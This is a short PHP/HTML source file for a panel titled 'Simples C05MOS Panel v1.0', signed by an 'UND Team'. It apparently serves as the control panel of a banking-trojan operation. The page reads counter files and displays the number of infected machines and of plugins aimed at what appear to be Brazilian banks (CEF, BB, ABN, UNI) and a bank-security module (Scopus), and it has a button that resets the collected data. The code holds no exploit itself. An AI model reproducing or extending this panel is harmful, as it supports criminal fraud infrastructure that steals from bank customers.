<?php

/* Máquinas... */
$arquivo = fopen("controles/maquinas_cn.txt", "r");
$maquinas = fgets($arquivo, 1024);
fclose($arquivo);

/* Plugins... */
/* CEF */
$arquivo = fopen("controles/plugins_cef.txt", "r");
$cef = fgets($arquivo, 1024);
fclose($arquivo);

/* BB */
$arquivo = fopen("controles/plugins_bbx.txt", "r");
$bb = fgets($arquivo, 1024);
fclose($arquivo);

/* ABN */
$arquivo = fopen("controles/plugins_abn.txt", "r");
$abn = fgets($arquivo, 1024);
fclose($arquivo);

/* UNI */
$arquivo = fopen("controles/plugins_uni.txt", "r");
$uni = fgets($arquivo, 1024);
fclose($arquivo);

/* Scopus */
$arquivo = fopen("controles/plugins_scp.txt", "r");
$scp = fgets($arquivo, 1024);
fclose($arquivo);

?>
<html>
<head>
<title>C0SM05</title>
</head>
<body bgcolor="black">

<table cellspacing="10" cellpadding="1" >
	<tr>
		<td align="center" colspan="5" ><b><font style="color: green;">Simples C05MOS Panel v1.0</font></b></td>
	</tr>
	
	<tr><td>&nbsp;</td></tr>
	
	<tr>
		<td colspan="5"><font style="color: green;" ><b>Quantidade de m&aacute;quinas: <?php echo $maquinas; ?></b></font></td>
	</tr>
	
	<tr>
		<td align="left" ><font style="color: green;"><b>CEF</b></font></td>
		<td align="left" ><font style="color: green;"><b>BB</font></td>
		<td align="left" ><font style="color: green;"><b>UNI</font></td>
		<td align="left" ><font style="color: green;"><b>ABN</font></td>
		<td align="left" ><font style="color: green;"><b>SCP</font></td>
	</tr>
	
	<tr>
		<td align="left" ><font style="color: green;"><b><?php echo $cef; ?></b></font></td>
		<td align="left" ><font style="color: green;"><b><?php echo $bb; ?></font></td>
		<td align="left" ><font style="color: green;"><b><?php echo $uni; ?></font></td>
		<td align="left" ><font style="color: green;"><b><?php echo $abn; ?></font></td>
		<td align="left" ><font style="color: green;"><b><?php echo $scp; ?></font></td>
	</tr>
	
	<tr><td>&nbsp;</td></tr>
	
	<tr>
		<td colspan="5">
			<form action="limpar_dados.php" method="post">
			<font style="color: green;" ><b><input type="submit" value="Zerar"></b></font>
			</form>
		</td>
	</tr>
	
	<tr>
		<td colspan="5" align="center" ><font style="color: green;" ><b>UND Team - Und3rgr0undz f0r3v3rz</b></font></td>
	</tr>
	
</table>

</body>
</html>
